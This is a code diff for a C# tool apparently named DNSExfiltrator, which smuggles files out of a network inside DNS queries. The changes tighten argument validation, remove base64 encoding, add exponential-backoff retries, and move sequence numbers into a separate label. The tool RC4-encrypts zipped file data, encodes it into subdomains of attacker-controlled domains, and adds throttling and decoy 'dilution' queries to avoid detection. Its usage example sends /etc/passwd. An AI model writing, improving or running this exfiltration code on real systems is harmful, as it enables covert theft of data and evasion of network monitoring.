@@ -27,20 +27,20 @@ namespace DNSExfiltrator
 
         private static void PrintUsage()
         {
-            Console.WriteLine("Usage: mono DNSExfiltrator.exe <file> <domain> <password> [options]");
+            Console.WriteLine("Usage: mono DNSExfiltrator.exe <file> <domain file> <password> [options]");
             Console.WriteLine("");
             Console.WriteLine("Options:");
             Console.WriteLine("  s=<server>    DNS server IP address");
             Console.WriteLine("  t=<ms>        Throttle time in milliseconds");
             Console.WriteLine("  tr=<ms>       Random throttle (0 to ms)");
             Console.WriteLine("  l=<size>      Max label length (default: 63)");
-            Console.WriteLine("  e=<encoding>  Encoding: base32map, base32, base64, hex (default: base32map)");
+            Console.WriteLine("  e=<encoding>  Encoding: base32map, base32, hex (default: base32map)");
             Console.WriteLine("  retry=<n>     Max retry attempts (default: 3)");
             Console.WriteLine("  retrydelay=<ms>  Delay before retry (default: 1000)");
             Console.WriteLine("  dil=<count>  Number of dilution requests sent between two tunneling requests (default: 0)");
             Console.WriteLine("");
             Console.WriteLine("Example:");
-            Console.WriteLine("  mono DNSExfiltrator.exe /etc/passwd test.com pass123 s=127.0.0.1 e=base64 l=20");
+            Console.WriteLine("  mono DNSExfiltrator.exe /etc/passwd domains.txt pass123 s=127.0.0.1 e=base32 l=20");
         }
 
         private static void PrintColor(string text)
@@ -65,20 +65,7 @@ namespace DNSExfiltrator
             return Base32.ToBase32String(data).Replace("=", "");
         }
 
-        private static string ToBase64(byte[] data)
-        {
-            // DNS-safe Base64 variant:
-            // Standard Base64 uses: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
-            // DNS-safe variant: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-x
-            // Mapping: + -> -, / -> x
-            // This is reversible: - -> +, x -> /
-            string encoded = Convert.ToBase64String(data).Replace("=", "");
-            encoded = encoded.Replace("+", "-");
-            encoded = encoded.Replace("/", "x");
-            return encoded;
-        }
-
-        private static string ToHex(byte[] data)
+private static string ToHex(byte[] data)
         {
             return BitConverter.ToString(data).Replace("-", "").ToLower();
         }
@@ -102,7 +89,6 @@ namespace DNSExfiltrator
         private static string Encode(byte[] data, string encoding)
         {
             if (encoding == "base32") return ToBase32(data);
-            if (encoding == "base64") return ToBase64(data);
             if (encoding == "hex") return ToHex(data);
             return ToBase32Map(data);
         }
@@ -111,18 +97,16 @@ namespace DNSExfiltrator
         {
             if (encoding == "base32map") return 0;
             if (encoding == "base32") return 1;
-            if (encoding == "base64") return 2;
-            if (encoding == "hex") return 3;
+            if (encoding == "hex") return 2;
             return 0;
         }
 
         private static string buildDilutionDomain(Random rnd)
         {
-            char[] vowels = new char[] { 'a', 'e', 'i', 'o', 'u', 'w'};
+            char[] vowels = new char[] { 'a', 'e', 'i', 'o', 'u', 'w' };
             char baseChar = vowels[rnd.Next(vowels.Length)];
-            int length = rnd.Next(1,3);
-            string subdomain = new string(baseChar, length);
-            return subdomain;
+            int length = rnd.Next(3, 6);  // Generate 3-5 char subdomains (avoid 1-char)
+            return new string(baseChar, length);
         }
 
         private static bool VerifyAck(string reply, int expectedValue)
@@ -140,6 +124,71 @@ namespace DNSExfiltrator
             catch
             {
                 return false;
+            }
+        }
+
+        public static class RetryHelper
+        {
+            public enum FailureType
+            {
+                None,
+                DnsError,
+                EmptyReply,
+                WrongAck,
+                Timeout
+            }
+            
+            public static int CalculateBackoffDelay(int baseDelay, int attempt, int maxDelay = 10000)
+            {
+                // Exponential backoff: baseDelay * 2^attempt
+                // Cap at maxDelay (10 seconds)
+                int delay = baseDelay * (int)Math.Pow(2, attempt);
+                return Math.Min(delay, maxDelay);
+            }
+            
+            public static FailureType ClassifyFailure(Exception ex, string reply, int expectedSeq)
+            {
+                if (ex != null)
+                {
+                    if (ex is System.Net.Sockets.SocketException || ex is System.Net.WebException)
+                        return FailureType.DnsError;
+                    return FailureType.DnsError;
+                }
+                if (string.IsNullOrEmpty(reply))
+                    return FailureType.EmptyReply;
+                
+                // Check if it's a wrong ACK
+                if (!string.IsNullOrEmpty(reply))
+                {
+                    try
+                    {
+                        string[] octets = reply.Split('.');
+                        if (octets.Length == 4)
+                        {
+                            int lastOctet = int.Parse(octets[3]);
+                            if (lastOctet != expectedSeq)
+                                return FailureType.WrongAck;
+                        }
+                    }
+                    catch { }
+                }
+                
+                return FailureType.Timeout;
+            }
+            
+            public static void LogRetry(int attempt, int maxAttempts, FailureType failureType, int delayMs)
+            {
+                string failureDesc = "";
+                switch (failureType)
+                {
+                    case FailureType.DnsError: failureDesc = "DNS error"; break;
+                    case FailureType.EmptyReply: failureDesc = "Empty reply"; break;
+                    case FailureType.WrongAck: failureDesc = "Wrong ACK"; break;
+                    case FailureType.Timeout: failureDesc = "Timeout"; break;
+                }
+                Console.Write("\r[!] " + failureDesc + ", retrying... (" + (attempt + 1) + "/" + maxAttempts + ")    ");
+                if (delayMs > 0)
+                    Thread.Sleep(delayMs);
             }
         }
 
@@ -174,14 +223,52 @@ namespace DNSExfiltrator
                 int i = 3;
                 while (i < args.Length)
                 {
-                    if (args[i].StartsWith("s=")) dnsServer = args[i].Split('=')[1];
-                    else if (args[i].StartsWith("t=")) throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("tr=")) throttleRandomTime = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("l=")) labelMaxSize = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("e=")) encoding = args[i].Split('=')[1];
-                    else if (args[i].StartsWith("retry=")) maxRetries = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("retrydelay=")) retryDelay = Convert.ToInt32(args[i].Split('=')[1]);
-                    else if (args[i].StartsWith("dil=")) dilRate = Convert.ToInt32(args[i].Split('=')[1]);
+                    string arg = args[i];
+                    try
+                    {
+                        if (arg.StartsWith("s=")) dnsServer = arg.Split('=')[1];
+                        else if (arg.StartsWith("t="))
+                        {
+                            throttleTime = Convert.ToInt32(arg.Split('=')[1]);
+                            if (throttleTime < 0) throw new ArgumentException("Throttle time cannot be negative");
+                        }
+                        else if (arg.StartsWith("tr="))
+                        {
+                            throttleRandomTime = Convert.ToInt32(arg.Split('=')[1]);
+                            if (throttleRandomTime < 0) throw new ArgumentException("Random throttle time cannot be negative");
+                        }
+                        else if (arg.StartsWith("l="))
+                        {
+                            labelMaxSize = Convert.ToInt32(arg.Split('=')[1]);
+                            if (labelMaxSize < 1 || labelMaxSize > 63) throw new ArgumentException("Label max size must be 1-63");
+                        }
+                        else if (arg.StartsWith("e="))
+                        {
+                            encoding = arg.Split('=')[1];
+                            if (encoding != "base32" && encoding != "base32map" && encoding != "hex")
+                                throw new ArgumentException("Encoding must be base32, base32map or hex");
+                        }
+                        else if (arg.StartsWith("retry="))
+                        {
+                            maxRetries = Convert.ToInt32(arg.Split('=')[1]);
+                            if (maxRetries < 0) throw new ArgumentException("Retry count cannot be negative");
+                        }
+                        else if (arg.StartsWith("retrydelay="))
+                        {
+                            retryDelay = Convert.ToInt32(arg.Split('=')[1]);
+                            if (retryDelay < 0) throw new ArgumentException("Retry delay cannot be negative");
+                        }
+                        else if (arg.StartsWith("dil="))
+                        {
+                            dilRate = Convert.ToInt32(arg.Split('=')[1]);
+                            if (dilRate < 0) throw new ArgumentException("Dilution rate cannot be negative");
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        PrintColor("[!] Invalid argument: " + arg + " - " + e.Message);
+                        return;
+                    }
                     i++;
                 }
             }
@@ -242,8 +329,42 @@ namespace DNSExfiltrator
                 PrintColor(String.Format("[*] Effective label size (base32map): {0} base32 chars", effectiveLabelSize));
             }
 
-            // INIT with file size (not totalRequests)
-            string initPayload = EncodingToNumber(encoding) + "|" + zipData.Length;
+            // Calculate chunk size in bytes based on encoding (account for encoding overhead).
+            // One byte per chunk stays reserved: the sequence number used to travel inside
+            // the chunk (FIX for B2-ENC-001) and now has its own label; keeping the byte
+            // keeps chunk sizes comparable with earlier runs.
+            int chunkSize;
+            int overheadBytes = 1;
+
+            switch (encoding)
+            {
+                case "hex":
+                    // hex: n bytes -> n * 2 chars
+                    chunkSize = effectiveLabelSize / 2 - overheadBytes;
+                    break;
+                case "base32map":
+                case "base32":
+                    // base32: n bytes -> ceil(n * 8/5) chars. For base32map,
+                    // effectiveLabelSize already counts base32 characters (labelMaxSize / 3),
+                    // each of which becomes a three-letter word.
+                    chunkSize = (effectiveLabelSize * 5) / 8 - overheadBytes;
+                    break;
+                default:
+                    PrintColor("[!] Unsupported encoding: " + encoding);
+                    return;
+            }
+
+            if (chunkSize < 1)
+            {
+                PrintColor(String.Format("[!] Label size {0} is too small for {1}: no room for data", labelMaxSize, encoding));
+                return;
+            }
+            PrintColor(String.Format("[*] Chunk size: {0} bytes per query", chunkSize));
+
+            // INIT: "<encoding>|<file size>|". The trailing '|' marks the end: the
+            // server decodes the init after every part, and without it a prefix such
+            // as "1|303" of "1|3030" would already look complete.
+            string initPayload = EncodingToNumber(encoding) + "|" + zipData.Length + "|";
             string initEnc = ToBase32Map(Encoding.UTF8.GetBytes(initPayload)).ToLower();
 
             PrintColor("[*] Init payload: " + initPayload);
@@ -261,12 +382,15 @@ namespace DNSExfiltrator
                 string request = initPart + "." + domainList[i % domainList.Length];
 
                 bool success = false;
+                RetryHelper.FailureType lastFailure = RetryHelper.FailureType.None;
+                
                 for (int attempt = 0; attempt < maxRetries && !success; attempt++)
                 {
                     if (attempt > 0)
                     {
-                        PrintColor(String.Format("[*] Retry {0}/{1} for init part {2}", attempt, maxRetries, i + 1));
-                        Thread.Sleep(retryDelay);
+                        // FIX for B4-RETRY-002: Exponential backoff
+                        int backoffDelay = RetryHelper.CalculateBackoffDelay(retryDelay, attempt);
+                        RetryHelper.LogRetry(attempt, maxRetries, lastFailure, backoffDelay);
                     }
 
                     try
@@ -280,16 +404,24 @@ namespace DNSExfiltrator
                             PrintColor("[+] Init part " + (i + 1) + " OK (Reply: " + reply + ")");
                             success = true;
                         }
+                        else
+                        {
+                            // FIX for B4-RETRY-001: Track failure type
+                            lastFailure = RetryHelper.FailureType.EmptyReply;
+                        }
                     }
                     catch (Exception e)
                     {
-                        PrintColor("[!] Init part " + (i + 1) + " failed: " + e.Message);
+                        // FIX for B4-RETRY-001: Track failure type
+                        lastFailure = RetryHelper.FailureType.DnsError;
+                        if (attempt == 0)
+                            PrintColor("[!] Init part " + (i + 1) + " failed: " + e.Message);
                     }
                 }
 
                 if (!success)
                 {
-                    PrintColor("[!] Init failed after " + maxRetries + " attempts");
+                    PrintColor("[!] Init failed after " + maxRetries + " attempts (last failure: " + lastFailure + ")");
                     return;
                 }
 
@@ -301,32 +433,6 @@ namespace DNSExfiltrator
             // Create RC4 instance for streaming encryption (maintains state)
             RC4 rc4 = new RC4(Encoding.UTF8.GetBytes(password));
 
-            // Calculate chunk size in bytes based on encoding (account for encoding overhead)
-            int chunkSize;
-            switch (encoding)
-            {
-                case "base64":
-                    // base64: 3 bytes = 4 chars, so for L chars: floor(L * 3 / 4) bytes
-                    chunkSize = (effectiveLabelSize * 3) / 4;
-                    break;
-                case "hex":
-                    // hex: 1 byte = 2 chars
-                    chunkSize = effectiveLabelSize / 2;
-                    break;
-                case "base32map":
-                    // base32map: effectiveLabelSize is number of base32 chars, each maps to 3 final chars
-                    // base32: 5 bytes = 8 chars, so for L base32 chars: floor(L * 5 / 8) bytes
-                    chunkSize = (effectiveLabelSize * 5) / 8;
-                    break;
-                case "base32":
-                    // base32: 5 bytes = 8 chars (5 bits per base32 char)
-                    chunkSize = (effectiveLabelSize * 5) / 8;
-                    break;
-                default:
-                    // fallback to base64 calculation
-                    chunkSize = (effectiveLabelSize * 3) / 4;
-                    break;
-            }
 
             // Send data with ACK verification
             int requestsSent = 0;
@@ -351,25 +457,36 @@ namespace DNSExfiltrator
                 }
 
                 int len = Math.Min(chunkSize, zipData.Length - offset);
-                byte[] chunk = new byte[len + 1]; // +1 for sequence number
-                chunk[0] = (byte)(requestsSent % 256); // Sequence number
-                Array.Copy(zipData, offset, chunk, 1, len);
+                byte[] chunk = new byte[len]; // No sequence byte - sent in label only
+                Array.Copy(zipData, offset, chunk, 0, len);
 
-                // Encrypt this chunk with seq_number (RC4 maintains state)
+                // Encrypt this chunk (no seq byte - seq is in label)
                 byte[] encryptedChunk = rc4.Encrypt(chunk, chunk.Length);
 
                 // Encode
                 string encodedChunk = Encode(encryptedChunk, encoding).ToLower();
 
-                // Send as single label (no separate sequence number)
-                string request = encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];
+                // FIX for B3-CHK-001: Enforce label length limit
+                if (encodedChunk.Length > labelMaxSize)
+                {
+                    PrintColor(String.Format("[!] ERROR: Encoded chunk exceeds labelMaxSize! ({0} > {1})", encodedChunk.Length, labelMaxSize));
+                    continue;
+                }
+
+                // Send as multi-label: seq.encodedData.domain.com
+                // Use requestsSent % 256 to match the encrypted sequence byte
+                string request = (requestsSent % 256) + "." + encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];
 
                 bool success = false;
+                RetryHelper.FailureType lastFailure = RetryHelper.FailureType.None;
+                
                 for (int attempt = 0; attempt < maxRetries && !success; attempt++)
                 {
                     if (attempt > 0)
                     {
-                        Thread.Sleep(retryDelay);
+                        // FIX for B4-RETRY-002: Exponential backoff
+                        int backoffDelay = RetryHelper.CalculateBackoffDelay(retryDelay, attempt);
+                        RetryHelper.LogRetry(attempt, maxRetries, lastFailure, backoffDelay);
                     }
 
                     try
@@ -378,7 +495,12 @@ namespace DNSExfiltrator
                             DNSResolver.GetARecord(request) :
                             DGResolver.GetARecord(dnsServer, request);
 
-                        if (VerifyAck(reply, requestsSent % 256))
+                        if (String.IsNullOrEmpty(reply))
+                        {
+                            // FIX for B4-RETRY-001: Track failure type
+                            lastFailure = RetryHelper.FailureType.EmptyReply;
+                        }
+                        else if (VerifyAck(reply, requestsSent % 256))
                         {
                             success = true;
                             requestsSent++;
@@ -387,25 +509,21 @@ namespace DNSExfiltrator
                         }
                         else
                         {
-                            if (attempt < maxRetries - 1)
-                            {
-                                Console.Write("\r[!] Wrong ACK, retrying... ({0}/{1})    ", attempt + 1, maxRetries);
-                            }
+                            // FIX for B4-RETRY-001: Track failure type
+                            lastFailure = RetryHelper.FailureType.WrongAck;
                         }
                     }
                     catch
                     {
-                        if (attempt < maxRetries - 1)
-                        {
-                            Console.Write("\r[!] Request failed, retrying... ({0}/{1})    ", attempt + 1, maxRetries);
-                        }
+                        // FIX for B4-RETRY-001: Track failure type
+                        lastFailure = RetryHelper.FailureType.DnsError;
                     }
                 }
 
                 if (!success)
                 {
                     Console.WriteLine();
-                    PrintColor(String.Format("[!] Failed to send request {0} after {1} attempts", requestsSent, maxRetries));
+                    PrintColor(String.Format("[!] Failed to send request {0} after {1} attempts (last failure: {2})", requestsSent, maxRetries, lastFailure));
                     return;
                 }
 
